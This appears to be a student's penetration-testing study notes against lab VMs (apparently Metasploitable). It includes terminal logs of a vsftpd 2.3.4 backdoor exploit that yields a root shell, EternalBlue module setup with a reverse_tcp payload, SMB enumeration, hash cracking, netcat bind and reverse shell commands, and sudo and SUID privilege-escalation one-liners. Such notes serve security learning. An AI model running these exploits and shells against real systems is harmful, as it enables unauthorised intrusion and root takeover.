+/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-syst.nse
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
+/usr/share/nmap/scripts/tftp-enum.nse
+
+
+──(root㉿kali)-[/usr/share/nmap]
+└─# nmap --script /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse 192.168.103.135 -p21 -Pn -n
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 06:47 EDT
+Nmap scan report for 192.168.103.135
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  BID:48539  CVE:CVE-2011-2523
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://www.securityfocus.com/bid/48539
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+MAC Address: 00:0C:29:D1:EB:F4 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/nmap]
+└─# 
+
+
+https://www.exploit-db.com/
+
+
+msfconsole -q ##quit banner
+
+ix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.103.135  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.103.135:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.103.135:21 - USER: 331 Please specify the password.
+[+] 192.168.103.135:21 - Backdoor service has been spawned, handling...
+[+] 192.168.103.135:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+
+[*] Command shell session 1 opened (192.168.103.128:40757 -> 192.168.103.135:6200) at 2023-04-15 07:03:50 -0400
+
+
+
+
+id
+uid=0(root) gid=0(root)
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+=====================================
+
+─# locate *.nse | grep  smb
+/usr/share/nmap/scripts/smb-brute.nse
+/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
+/usr/share/nmap/scripts/smb-enum-domains.nse
+/usr/share/nmap/scripts/smb-enum-groups.nse
+/usr/share/nmap/scripts/smb-enum-processes.nse
+/usr/share/nmap/scripts/smb-enum-services.nse
+/usr/share/nmap/scripts/smb-enum-sessions.nse
+/usr/share/nmap/scripts/smb-enum-shares.nse
+/usr/share/nmap/scripts/smb-enum-users.nse
+/usr/share/nmap/scripts/smb-flood.nse
+/usr/share/nmap/scripts/smb-ls.nse
+/usr/share/nmap/scripts/smb-mbenum.nse
+/usr/share/nmap/scripts/smb-os-discovery.nse============>1st discovery
+/usr/share/nmap/scripts/smb-print-text.nse
+/usr/share/nmap/scripts/smb-protocols.nse=============>2nd discovery
+/usr/share/nmap/scripts/smb-psexec.nse
+/usr/share/nmap/scripts/smb-security-mode.nse
+/usr/share/nmap/scripts/smb-server-stats.nse
+/usr/share/nmap/scripts/smb-system-info.nse
+/usr/share/nmap/scripts/smb-vuln-conficker.nse
+/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
+/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
+/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+/usr/share/nmap/scripts/smb-vuln-webexec.nse
+/usr/share/nmap/scripts/smb-webexec-exploit.nse
+/usr/share/nmap/scripts/smb2-capabilities.nse
+/usr/share/nmap/scripts/smb2-security-mode.nse
+/usr/share/nmap/scripts/smb2-time.nse
+/usr/share/nmap/scripts/smb2-vuln-uptime.nse
+                                                                 
+
+
+smbmap==> to list down shares
+
+
+sudo nmap <ip> --script=/usr/share/nmap/scripts/smb-os-discovery.nse -Pn -n -p 445
+sudo nmap <ip> --script=/usr/share/nmap/scripts/smb-protocols.nse -Pn -n -p 445
+
+
+==========================
+└─# nmap 192.168.103.254                                                            
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 01:21 EDT
+Nmap scan report for 192.168.103.254
+Host is up (0.0020s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:4D:D3:40 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# 
+smbmap -H 192.168.103.135      
+[+] IP: 192.168.103.135:445     Name: 192.168.103.135                                   
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+                                                                                                                                                                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# nmap 192.168.103.254 -Pn -n -p 445
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 01:22 EDT
+Nmap scan report for 192.168.103.254
+Host is up (0.00035s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:4D:D3:40 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# nmap 192.168.103.254 --script /usr/share/nmap/scripts/smb-protocols.nse -Pn -n -p 445
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 01:22 EDT
+Nmap scan report for 192.168.103.254
+Host is up (0.00037s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:4D:D3:40 (VMware)
+
+Host script results:
+| smb-protocols: 
+|   dialects: 
+|     202
+|     210
+|     300
+|     302
+|_    311
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# nmap 192.168.103.254 --script  -Pn -n -p 445 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 01:22 EDT
+NSE: failed to initialize the script engine:
+/usr/bin/../share/nmap/nse_main.lua:833: '-Pn' did not match a category, filename, or directory
+stack traceback:
+        [C]: in function 'error'
+        /usr/bin/../share/nmap/nse_main.lua:833: in local 'get_chosen_scripts'
+        /usr/bin/../share/nmap/nse_main.lua:1344: in main chunk
+        [C]: in ?
+
+QUITTING!
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# nmap 192.168.103.254 --script /usr/share/nmap/scripts/smb-os-discovery.nse  -Pn -n -p 445
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 01:23 EDT
+Nmap scan report for 192.168.103.254
+Host is up (0.00033s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 00:0C:29:4D:D3:40 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# smbclient \\192.168.103.254\tmp                                                    
+Password for [WORKGROUP\root]:
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# smbclient //192.168.103.254/tmp
+Password for [WORKGROUP\root]:
+session setup failed: NT_STATUS_ACCESS_DENIED
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# smbclient //192.168.103.254/tmp
+Password for [WORKGROUP\root]:
+session setup failed: NT_STATUS_ACCESS_DENIED
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# smbclient //192.168.103.254/tmp
+Password for [WORKGROUP\root]:
+session setup failed: NT_STATUS_ACCESS_DENIED
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# enum4linux 192.168.103.254
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 29 01:24:47 2023
+
+ =========================================( Target Information )=========================================
+
+Target ........... 192.168.103.254
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on 192.168.103.254 )==========================
+                                                                                                                                                                                                                   
+                                                                                                                                                                                                                   
+[E] Can't find workgroup/domain                                                                                                                                                                                    
+                                                                                                                                                                                                                   
+                                                                                                                                                                                                                   
+
+ ==============================( Nbtstat Information for 192.168.103.254 )==============================
+                                                                                                                                                                                                                   
+Looking up status of 192.168.103.254                                                                                                                                                                               
+No reply from 192.168.103.254
+
+ ==================================( Session Check on 192.168.103.254 )==================================
+                                                                                                                                                                                                                   
+                                                                                                                                                                                                                   
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                                                                                                                     
+                                                                                                                                                                                                                   
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~]
+└─# 
+=======================================
+
+
+msf6 > search type:exploit smb
+
+Matching Modules
+================
+
+   #   Name                                                    Disclosure Date  Rank       Check  Description
+   -   ----                                                    ---------------  ----       -----  -----------
+   0   exploit/multi/http/struts_code_exec_classloader         2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   1   exploit/osx/browser/safari_file_policy                  2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   2   exploit/linux/misc/cisco_rv340_sslvpn                   2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
+   3   exploit/windows/scada/ge_proficy_cimplicity_gefebt      2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   4   exploit/windows/smb/generic_smb_dll_injection           2015-03-04       manual     No     Generic DLL Injection From Shared Resource
+   5   exploit/windows/http/generic_http_dll_injection         2015-03-04       manual     No     Generic Web Application DLL Injection
+   6   exploit/windows/smb/group_policy_startup                2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   7   exploit/windows/misc/hp_dataprotector_install_service   2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
+
+
+msf6 > 
+msf6 > use exploit exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms17_010_eternalblue
+
+[*] Using exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.103.128  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.103.135
+RHOST => 192.168.103.135
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/metasploit-framework/modules]
+└─# ls -ltr
+total 28
+drwxr-xr-x  3 root root 4096 Dec  5 08:38 evasion
+drwxr-xr-x 12 root root 4096 Dec  5 08:38 encoders
+drwxr-xr-x 12 root root 4096 Dec  5 08:38 nops
+drwxr-xr-x  6 root root 4096 Dec  5 08:38 payloads
+drwxr-xr-x 14 root root 4096 Dec  5 08:38 post
+drwxr-xr-x 22 root root 4096 Dec  5 08:38 auxiliary
+drwxr-xr-x 22 root root 4096 Dec  5 08:38 exploits
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/metasploit-framework/modules]
+└─# 
+
+
+msf6 exploit(windows/fileformat/videocharge_studio) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   VideoCharge Studio 2.12.3.685
+
+
+msf6 exploit(windows/fileformat/videocharge_studio) > show advanced
+
+Module advanced options (exploit/windows/fileformat/videocharge_studio):
+
+   Name                    Current Setting  Required  Description
+   ----                    ---------------  --------  -----------
+   ContextInformationFile                   no        The information file that contains context information
+   DisablePayloadHandler   true             no        Disable the handler code for the selected payload
+   DynamicSehRecord        false            no        Generate a dynamic SEH record (more stealthy)
+   EnableContextEncoding   false            no        Use transient context when encoding payloads
+   VERBOSE                 false            no        Enable detailed status messages
+   WORKSPACE                                no        Specify the workspace for this module
+   WfsDelay                2                no        Additional delay in seconds 
+   
+   
+   getuid,getpid===============>in meterpreter sessions
+   
+   
+   
+   iimediately after -->check user and groups
+   net users  <<ninja>>
+   sessions -k 1
+   
+   migrate 47182 to privelege
+   
+   [14:46] Jayanth (Guest)
+
+
+
+john --format=NT <hash file>
+john --format=NT <hashfile> --wordlist=<path>
+
+
+netcat:
+=======
+nc -lvp ipaddress
+
+nc <ip> 1212
+
+Bind shell:
+===========
+nc -lvp 1212 -e /bin/bas
+nc 127.0.0.1 1212
+
+
+reverse shell:
+==============
+nc -lvp 1234 and  execute payloads in peer ###satge payload
+
+
+satged payload: handle by multihandler using msfconsole. if using ntecat shell will die.
+ntecat can only non-staged shell payloads.
+
+staged: windows/shell/reverse_tcp 
+non-staged: windows/shell_reverse_tcp
+
+
+sessions and jobs
+
+sessions -K ##to kill all sessions with captil K. Active connections
+jobs  ---> a job created for listeners
+exploit -j ###for multitasking
+
+
+>>set ExitOnSession false ####jobs will not be killed
+
+https://github.com/rapid7/metasploitable3
+https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/Metasploitable3-ub1404.ova/download
+
+
+ 
+https://gtfobins.github.io/
+https://www.hackingarticles.in/penetration-testing/
+
+sudo -l
+
+sudo -u harry . -exec /bin/sh \; -quit
+
+
+find / -perm -u=s -type f  2> /dev/null ####suid file
+
+
+
+# find / -perm -u=s -type f  2> /dev/null 
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/kismet_cap_rz_killerbee
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/kismet_cap_ti_cc_2531
+/usr/bin/chsh
+/usr/bin/kismet_cap_nrf_51822
+/usr/bin/kismet_cap_ubertooth_one
+/usr/bin/gpasswd
+/usr/bin/fusermount3
+/usr/bin/kismet_cap_nxp_kw41z
+/usr/bin/kismet_cap_ti_cc_2540
+/usr/bin/su
+/usr/bin/kismet_cap_nrf_mousejack
+/usr/bin/pkexec
+/usr/bin/kismet_cap_linux_bluetooth
+/usr/bin/kismet_cap_linux_wifi
+/usr/bin/ntfs-3g
+/usr/bin/kismet_cap_nrf_52840
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/vmware-user-suid-wrapper
+/usr/sbin/mount.cifs
+/usr/sbin/mount.nfs
+/usr/sbin/pppd
+
+^C
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# ls -l /usr/bin/su                               
+-rwsr-xr-x 1 root root 72000 Nov 25 10:19 /usr/bin/su
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# 
+
+
+
+chown root:root iamhere #change owner
+chmod 4755 iamhere
+ 
+
